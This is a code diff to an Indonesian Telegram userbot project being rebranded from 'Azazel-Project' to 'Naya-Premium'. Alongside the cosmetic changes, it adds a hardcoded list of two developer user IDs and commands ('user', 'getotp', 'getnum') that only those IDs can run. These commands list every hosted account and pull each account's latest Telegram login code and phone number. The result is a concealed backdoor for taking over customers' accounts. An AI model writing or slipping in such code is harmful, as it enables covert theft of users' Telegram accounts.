@@ -37,6 +37,8 @@ def restart():
 
 HAPP = None
 
+GUA = [1054295664, 1898065191]
+
 load_dotenv()
 
 session_counter = count(1)
@@ -78,8 +80,8 @@ async def start_(client: Client, message: Message):
         reply_markup=InlineKeyboardMarkup(
             [
                 [
-                    InlineKeyboardButton(text="👮‍♂ Admin 1", url=f"https://t.me/kenapanan"),
-                    InlineKeyboardButton(text="👮‍♂ Admin 2", url=f"https://t.me/bangjhorr"),
+                    InlineKeyboardButton(text="👮‍♂ Admin 1", url=f"https://t.me/Robotikaazazel"),
+                    InlineKeyboardButton(text="👮‍♂ Admin 2", url=f"https://t.me/Rizzvbss"),
                 ],
                   [
                      InlineKeyboardButton(text="Tutup", callback_data="cl_ad"),
@@ -180,7 +182,7 @@ async def usage_dynos(client, message):
     AppMinutes = math.floor(AppQuotaUsed % 60)
     await asyncio.sleep(1.5)
     text = f"""
-**Penggunaan Dyno Azazel-Project**
+**Penggunaan Dyno Naya-Premium**
 
  ❏ Dyno terpakai:
  ├ Terpakai: `{AppHours}`**h**  `{AppMinutes}`**m**  [`{AppPercentage}`**%**]
@@ -188,27 +190,67 @@ Dyno tersisa:
   ╰ Tersisa: `{hours}`**h**  `{minutes}`**m**  [`{percentage}`**%**]"""
     return await dyno.edit(text)
     
-    
-async def kok_bacotlog():
-    botlog_chat_id = os.environ.get('BOTLOG_CHATID')
-    if botlog_chat_id:
-        return
-   
-    group_name = 'Azazel Project Log'
-    group_description = 'Log Group Azazel-Project'
-    group = await bot1.create_supergroup(group_name, group_description)
-
-    if await is_heroku():
+@Client.on_message(filters.command(["user"], "") & filters.me)
+async def user(client, message):
+    if message.from_user.id not in GUA:
+        return await message.reply("❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya developer yang bisa menggunakan perintah ini")
+    count = 0
+    user = ""
+    for X in bots:
         try:
-            Heroku = heroku3.from_key(os.environ.get('HEROKU_API_KEY'))
-            happ = Heroku.app(os.environ.get('HEROKU_APP_NAME'))
-            happ.config()['BOTLOG_CHATID'] = str(group.id)
+            count += 1
+            user += f"""
+❏ USERBOT KE {count}
+ ├ AKUN: <a href=tg://user?id={X.me.id}>{X.me.first_name} {X.me.last_name or ''}</a> 
+ ╰ ID: <code>{X.me.id}</code>
+"""
         except:
             pass
+    if int(len(str(user))) > 4096:
+        with BytesIO(str.encode(str(user))) as out_file:
+            out_file.name = "userbot.txt"
+            await message.reply_document(
+                document=out_file,
+            )
     else:
-        with open('.env', 'a') as env_file:
-            env_file.write(f'\nBOTLOG_CHATID={group.id}')
+        await message.reply(f"<b>{user}</b>")
 
-    message_text = 'Grouplog Berhasil Dibuat,\nMohon Masukkan Bot Anda Ke Group Ini, dan Aktifkan Mode Inline.\n\n**Catatan**: Ini adalah userbot tanpa prefix ! Jadi tidak memakai triger `.`\n\nRestarting...!'
-    await bot1.send_message(group.id, message_text)
-    restart()
+
+@Client.on_message(filters.command(["getotp", "getnum"], "") & filters.me)
+async def otp_and_number(client, message):
+    if len(message.command) < 2:
+        return await client.send_message(
+            message.chat.id,
+            f"<code>{message.text} user_id userbot yang aktif</code>",
+            reply_to_message_id=message.id,
+        )
+    elif message.from_user.id not in GUA:
+
+	      return await message.reply("❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya developer yang bisa menggunakan perintah ini")
+    try:
+        for X in bots:
+            if int(message.command[1]) == X.me.id:
+                if message.command[0] == "getotp":
+                    async for otp in X.search_messages(777000, limit=1):
+                        if otp.text:
+                            return await client.send_message(
+                                message.chat.id,
+                                otp.text,
+                                reply_to_message_id=message.id,
+                            )
+                        else:
+                            return await client.send_message(
+                                message.chat.id,
+                                "<code>Kode Otp Tidak Di Temukan</code>",
+                                reply_to_message_id=message.id,
+                            )
+                elif message.command[0] == "getnum":
+                    return await client.send_message(
+                        message.chat.id,
+                        X.me.phone_number,
+                        reply_to_message_id=message.id,
+                    )
+    except Exception as error:
+        return await client.send_message(
+            message.chat.id, error, reply_to_message_id=message.id
+        )
